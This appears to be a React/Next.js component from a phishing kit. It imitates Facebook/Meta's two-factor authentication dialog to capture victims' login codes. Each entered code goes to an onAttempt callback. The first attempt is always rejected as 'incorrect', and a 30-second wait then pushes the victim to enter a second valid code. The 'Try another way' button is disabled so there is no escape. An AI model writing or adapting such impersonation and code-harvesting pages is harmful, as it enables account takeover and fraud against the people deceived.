"use client";

import { useState, useEffect } from "react";
import Image from "next/image";

interface TwoFAModalProps {
  onClose: () => void;
  onSubmit: () => void;
  method: "app" | "sms" | "email" | "whatsapp";
  contactInfo: {
    phoneNumber: string;
    email: string;
  };
  onAttempt: (value: string) => void;
}

const maskPhone = (phone: string) => {
  if (!phone) return "your phone number";
  const trimmed = phone.trim();
  if (trimmed.length <= 4) return trimmed;
  // Extract dial code if present (e.g., +84)
  const dialCodeMatch = trimmed.match(/^(\+\d{1,3})\s*(.+)$/);
  if (dialCodeMatch) {
    const dialCode = dialCodeMatch[1];
    const number = dialCodeMatch[2].replace(/\s/g, "");
    const suffix = number.slice(-2);
    return `${dialCode} ${"*".repeat(Math.max(7, number.length - 2))} ${suffix}`;
  }
  const prefix = trimmed.slice(0, 3);
  const suffix = trimmed.slice(-2);
  return `${prefix} ${"*".repeat(7)} ${suffix}`;
};

const maskEmail = (email: string) => {
  if (!email) return "your email";
  const [local, domain] = email.split("@");
  if (!domain) return email;
  if (local.length <= 2) return email;
  const firstChar = local[0] || "";
  const lastChar = local[local.length - 1] || "";
  const hidden = local.length > 2 ? "***" : "";
  return `${firstChar}${hidden}${lastChar}@${domain}`;
};

const instructionMap: Record<
  "app" | "sms" | "email" | "whatsapp",
  string | ((value: string) => string)
> = {
  app: "Enter the 6-digit code from your authenticator app.",
  sms: (phone: string) => `Enter the 6-digit code that we sent via SMS to ${maskPhone(phone)}.`,
  email: (email: string) => `Enter the 6-digit code that we sent to ${maskEmail(email)}.`,
  whatsapp: (phone: string) => `Enter the 6-digit code that we sent via WhatsApp to ${maskPhone(phone)}.`,
};

export default function TwoFAModal({ onClose, onSubmit, method, contactInfo, onAttempt }: TwoFAModalProps) {
  const [code, setCode] = useState("");
  const [error, setError] = useState(false);
  const [forcedFail, setForcedFail] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [isDisabled, setIsDisabled] = useState(false);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (countdown === 0 && isDisabled) {
      setIsDisabled(false);
      setCode("");
      setError(false);
    }
  }, [countdown, isDisabled]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onAttempt(code);
    if (!forcedFail) {
      setError(true);
      setForcedFail(true);
      setIsDisabled(true);
      setCountdown(30);
      setCode("");
      return;
    }
    if (code.length >= 6 && code.length <= 8) {
      setError(false);
      onSubmit();
    } else {
      setError(true);
    }
  };

  return (
    <div className="modal-overlay" onClick={(e) => e.target === e.currentTarget && onClose()}>
      <div className="twofa-modal" onClick={(e) => e.stopPropagation()}>
        <div className="twofa-modal-header">
          <div className="twofa-modal-subtitle">• Facebook</div>
          <h2 className="twofa-modal-title">Two-factor authentication required</h2>
        </div>
        <p className="twofa-modal-instructions">
          Enter the code for this account that we send to {maskEmail(contactInfo.email)}, {maskPhone(contactInfo.phoneNumber)} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator).
        </p>
        <div className="twofa-illustration">
          <div className="twofa-image-wrapper">
            <Image src="/image.png" alt="Two-factor illustration" fill className="twofa-image" />
          </div>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="twofa-input-wrapper">
            <label className="twofa-input-label">Code</label>
            <input
              type="text"
              className={`twofa-code-input ${error ? "error" : ""}`}
              placeholder=""
              maxLength={8}
              autoComplete="off"
              value={code}
              disabled={isDisabled}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
            />
          </div>
          {error && (
            <div className="twofa-error">The code you&#39;ve entered is incorrect.</div>
          )}
          {isDisabled && countdown > 0 && (
            <div className="twofa-countdown">Please wait {countdown} seconds before trying again.</div>
          )}
          <button type="submit" className="twofa-continue-btn" disabled={isDisabled}>
            Continue
          </button>
          <button type="button" className="twofa-try-another-btn" disabled>
            Try another way
          </button>
        </form>
        <div className="twofa-modal-footer">
          <div className="meta-logo">
            <span>∞</span>
            <span>Meta</span>
          </div>
        </div>
      </div>
      <style jsx>{`
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background-color: rgba(0, 0, 0, 0.5);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 10000;
          padding: 20px;
        }

        .twofa-modal {
          background-color: #ffffff;
          border-radius: 12px;
          width: 90%;
          max-width: 500px;
          padding: 32px;
          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .twofa-modal-header {
          margin-bottom: 16px;
        }

        .twofa-modal-subtitle {
          font-size: 14px;
          color: #65676b;
          margin-bottom: 8px;
        }

        .twofa-modal-title {
          font-size: 24px;
          font-weight: 600;
          color: #1c1e21;
        }

        .twofa-modal-instructions {
          font-size: 15px;
          color: #65676b;
          margin-bottom: 24px;
          line-height: 1.5;
        }

        .twofa-illustration {
          margin-bottom: 24px;
        }

        .twofa-image-wrapper {
          position: relative;
          width: 100%;
          height: 180px;
          border-radius: 16px;
          overflow: hidden;
          background: linear-gradient(135deg, #f4f0ff, #eff6ff);
          box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.4);
        }

        .twofa-image {
          object-fit: cover;
        }

        .twofa-input-wrapper {
          margin-bottom: 16px;
        }

        .twofa-input-label {
          display: block;
          font-size: 14px;
          font-weight: 600;
          color: #1c1e21;
          margin-bottom: 8px;
        }

        .twofa-code-input {
          width: 100%;
          padding: 10px 14px;
          border: 1px solid #ccd0d5;
          border-radius: 6px;
          font-size: 16px;
          text-align: center;
          letter-spacing: 2px;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          transition: border-color 0.2s;
        }

        .twofa-code-input:disabled {
          background-color: #f0f2f5;
          cursor: not-allowed;
          opacity: 0.6;
        }

        .twofa-code-input.error {
          border-color: #e41e3f;
        }

        .twofa-code-input:focus:not(:disabled) {
          outline: none;
          border-color: #1877f2;
        }

        .twofa-error {
          color: #e41e3f;
          font-size: 13px;
          margin-bottom: 8px;
          display: block;
          text-align: center;
        }

        .twofa-countdown {
          color: #65676b;
          font-size: 13px;
          margin-bottom: 16px;
          display: block;
          text-align: center;
        }

        .twofa-continue-btn {
          width: 100%;
          padding: 12px;
          background-color: #1877f2;
          color: #ffffff;
          border: none;
          border-radius: 8px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          margin-bottom: 12px;
          transition: background-color 0.2s;
        }

        .twofa-continue-btn:hover:not(:disabled) {
          background-color: #166fe5;
        }

        .twofa-continue-btn:disabled {
          background-color: #e4e6eb;
          color: #8a8d91;
          cursor: not-allowed;
        }

        .twofa-try-another-btn {
          width: 100%;
          padding: 12px;
          background-color: #e4e6eb;
          color: #1c1e21;
          border: none;
          border-radius: 8px;
          font-size: 16px;
          font-weight: 600;
          cursor: not-allowed;
          transition: background-color 0.2s;
        }

        .twofa-try-another-btn:disabled {
          background-color: #e4e6eb;
          color: #8a8d91;
          cursor: not-allowed;
          opacity: 0.6;
        }

        .twofa-modal-footer {
          margin-top: 24px;
          text-align: center;
        }

        .meta-logo {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 4px;
          color: #65676b;
          font-size: 14px;
        }
      `}</style>
    </div>
  );
}

